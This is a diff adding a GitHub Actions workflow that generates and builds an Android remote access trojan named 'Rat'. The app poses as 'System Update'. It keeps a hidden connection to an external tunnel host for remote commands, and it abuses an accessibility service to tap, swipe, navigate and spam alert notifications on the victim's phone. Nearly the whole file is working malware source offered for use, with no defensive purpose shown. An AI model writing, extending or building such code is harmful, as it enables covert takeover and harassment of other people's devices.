@@ -1,0 +1,230 @@
+name: Build Android APK
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup JDK
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Create Project Files
+        run: |
+          mkdir -p app/src/main/java/com/test/rat
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+
+          cat > app/src/main/AndroidManifest.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.test.rat">
+              <uses-permission android:name="android.permission.INTERNET"/>
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+              <application android:label="System Update" android:theme="@android:style/Theme.NoTitleBar">
+                  <activity android:name=".MainActivity" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN"/>
+                          <category android:name="android.intent.category.LAUNCHER"/>
+                      </intent-filter>
+                  </activity>
+                  <service android:name=".ScreenService" android:exported="false"/>
+                  <service android:name=".TapService" android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService"/>
+                      </intent-filter>
+                      <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config"/>
+                  </service>
+              </application>
+          </manifest>
+          EOF
+
+          cat > app/src/main/res/xml/accessibility_service_config.xml <<'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:canPerformGestures="true" />
+          EOF
+
+          cat > app/src/main/res/values/strings.xml <<'EOF'
+          <resources><string name="app_name">System Update</string></resources>
+          EOF
+
+          # ВСТАВЬ СЮДА СВОЙ АДРЕС PINGGY
+          cat > app/src/main/java/com/test/rat/ScreenService.java <<'EOF'
+          package com.test.rat;
+          import android.app.*;
+          import android.content.Intent;
+          import android.os.*;
+          import java.io.*;
+          import java.net.Socket;
+
+          public class ScreenService extends Service {
+              private Socket socket;
+              private BufferedReader in;
+              @Override public int onStartCommand(Intent intent, int flags, int startId) {
+                  NotificationChannel ch = new NotificationChannel("rat", "Sys", NotificationManager.IMPORTANCE_LOW);
+                  ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(ch);
+                  startForeground(1, new Notification.Builder(this, "rat").setContentTitle("System Update").build());
+                  new Thread(new Runnable() {
+                      @Override public void run() {
+                          while (true) {
+                              try {
+                                  if (socket == null || socket.isClosed()) {
+                                      socket = new Socket("qjwba-88-147-152-145.run.pinggy-free.link", 46211); // АДРЕС
+                                      in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+                                  }
+                                  String line = in.readLine();
+                                  if (line != null) {
+                                      TapService.executeCommand(line);
+                                  } else { socket.close(); }
+                              } catch (Exception e) {
+                                  try { Thread.sleep(3000); } catch (Exception ex) {}
+                              }
+                          }
+                      }
+                  }).start();
+                  return START_STICKY;
+              }
+              @Override public IBinder onBind(Intent i) { return null; }
+          }
+          EOF
+
+          cat > app/src/main/java/com/test/rat/TapService.java <<'EOF'
+          package com.test.rat;
+          import android.accessibilityservice.*;
+          import android.view.accessibility.AccessibilityEvent;
+          import android.view.accessibility.AccessibilityNodeInfo;
+          import android.graphics.Path;
+          import android.media.AudioManager;
+          import android.content.Context;
+          import android.os.Bundle;
+          import android.app.NotificationManager;
+          import android.app.NotificationChannel;
+          import android.app.Notification;
+
+          public class TapService extends AccessibilityService {
+              public static TapService instance;
+              private static Thread spamThread = null;
+              private static boolean spamActive = false;
+
+              @Override public void onServiceConnected() { instance = this; }
+              @Override public void onAccessibilityEvent(AccessibilityEvent e) {}
+              @Override public void onInterrupt() {}
+
+              public static void executeCommand(String cmd) {
+                  if (instance == null) return;
+                  if (cmd.equals("HOME")) {
+                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
+                  } else if (cmd.equals("BACK")) {
+                      instance.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
+                  } else if (cmd.startsWith("TAP ")) {
+                      String[] a = cmd.split(" ");
+                      Path p = new Path();
+                      p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
+                      instance.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 50)).build(), null, null);
+                  } else if (cmd.startsWith("SWIPE ")) {
+                      String[] a = cmd.split(" ");
+                      Path p = new Path();
+                      p.moveTo(Float.parseFloat(a[1]), Float.parseFloat(a[2]));
+                      p.lineTo(Float.parseFloat(a[3]), Float.parseFloat(a[4]));
+                      instance.dispatchGesture(new GestureDescription.Builder().addStroke(new GestureDescription.StrokeDescription(p, 0, 300)).build(), null, null);
+                  } else if (cmd.startsWith("SPAM ")) {
+                      final String text = cmd.substring(5);
+                      stopSpam();
+                      spamActive = true;
+                      spamThread = new Thread(new Runnable() {
+                          @Override public void run() {
+                              int id = 1000;
+                              NotificationManager nm = (NotificationManager) instance.getSystemService(Context.NOTIFICATION_SERVICE);
+                              nm.createNotificationChannel(new NotificationChannel("spam", "Spam", NotificationManager.IMPORTANCE_HIGH));
+                              while (spamActive) {
+                                  Notification n = new Notification.Builder(instance, "spam").setContentTitle("Внимание").setContentText(text).setSmallIcon(android.R.drawable.ic_dialog_alert).build();
+                                  nm.notify(id++, n);
+                                  try { Thread.sleep(100); } catch (Exception e) {}
+                              }
+                              nm.cancelAll();
+                          }
+                      });
+                      spamThread.start();
+                  } else if (cmd.equals("STOP_SPAM")) {
+                      stopSpam();
+                  }
+              }
+              private static void stopSpam() {
+                  spamActive = false;
+                  if (spamThread != null) { try { spamThread.join(500); } catch (Exception e) {} spamThread = null; }
+                  if (instance != null) ((NotificationManager) instance.getSystemService(Context.NOTIFICATION_SERVICE)).cancelAll();
+              }
+          }
+          EOF
+
+          cat > app/src/main/java/com/test/rat/MainActivity.java <<'EOF'
+          package com.test.rat;
+          import android.app.Activity;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.widget.Button;
+          import android.widget.LinearLayout;
+          import android.provider.Settings;
+          import android.view.View;
+
+          public class MainActivity extends Activity {
+              @Override protected void onCreate(Bundle savedInstanceState) {
+                  super.onCreate(savedInstanceState);
+                  LinearLayout l = new LinearLayout(this); l.setOrientation(1);
+                  Button b1 = new Button(this); b1.setText("1. Запустить сервис");
+                  b1.setOnClickListener(new View.OnClickListener() {
+                      @Override public void onClick(View v) { startForegroundService(new Intent(MainActivity.this, ScreenService.class)); }
+                  });
+                  Button b2 = new Button(this); b2.setText("2. Дать управление");
+                  b2.setOnClickListener(new View.OnClickListener() {
+                      @Override public void onClick(View v) { startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)); }
+                  });
+                  l.addView(b1); l.addView(b2); setContentView(l);
+              }
+          }
+          EOF
+          
+          cat > app/build.gradle <<'EOF'
+          plugins { id 'com.android.application' }
+          android {
+              namespace 'com.test.rat'
+              compileSdk 33
+              defaultConfig {
+                  applicationId "com.test.rat"
+                  minSdk 24
+                  targetSdk 33
+                  versionCode 1
+                  versionName "1.0"
+              }
+          }
+          EOF
+
+          cat > build.gradle <<'EOF'
+          buildscript {
+              repositories { google(); mavenCentral() }
+              dependencies { classpath 'com.android.tools.build:gradle:8.1.0' }
+          }
+          allprojects { repositories { google(); mavenCentral() } }
+          EOF
+
+          cat > settings.gradle <<'EOF'
+          rootProject.name = "Rat"
+          include ':app'
+          EOF
+
+      - name: Build with Gradle
+        run: gradle wrapper && ./gradlew assembleDebug
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: app-debug
+          path: app/build/outputs/apk/debug/app-debug.apk
